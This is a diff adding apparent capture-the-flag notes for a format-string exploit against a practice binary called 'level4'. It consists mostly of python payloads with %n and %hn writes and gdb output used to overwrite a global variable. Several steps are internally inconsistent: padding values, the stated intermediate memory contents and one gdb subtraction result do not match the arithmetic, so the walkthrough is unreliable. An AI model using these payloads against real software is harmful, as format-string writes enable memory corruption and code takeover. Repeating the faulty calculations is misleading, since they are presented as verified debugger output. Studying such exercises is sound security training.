@@ -1,0 +1,56 @@
+same as previous level
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
+
+
+but let's try it with an other way
+
+gdb info variables
+$1 = (<data variable, no debug info> *) 0x8049810
+
+x = hexa, w = 32 bit
+gdb x/wx  0x8049810
+0x8049810 <m>:	0x00 00 00 00
+
+0x00        00           00     		00
+0x8049813	0x8049812    0x8049811		0x8049810
+
+basicly we need to replace 0x00000000 with 0x01025544
+
+we will use 0x8049812 and 0x8049810
+
+put a breakpoint on cmp
+(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%13$hn"')
+(gdb) x/wx 0x8049810
+
+we successfully writed 2 bytes(8) on each location ( 0x00[08] - 00[08])
+
+remember we need to write 0x1025544 which is 0x0102 and 0x5544
+
+ok lets write 0x1025 -> 
+
+since we're writing 8 bytes we need to remove it from our padding
+
+(gdb) print 0x0102 - 0x08
+$3 = 250
+run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" + "%12$hn" + "%13$hn"')
+(gdb) x/wx 0x8049810
+0x8049810 <m>:	0x01020102
+
+we successfully writed 0x1025 now the second part
+
+0x5544 -> 
+
+above we can see that the second part also get 0x1025 since we're adding padding, just remove this
+
+(gdb) print 0x5544 - 0x0102
+$4 = 2150
+
+(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" +"%12$hn" + "%17695x" + "%13$hn"')
+
+(gdb) x/wx 0x8049810
+0x8049810 <m>:	0x55440102
+
+oops its reverse we're writing upper bits first
+
+(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" +"%13$hn" + "%17695x" + "%12$hn"')
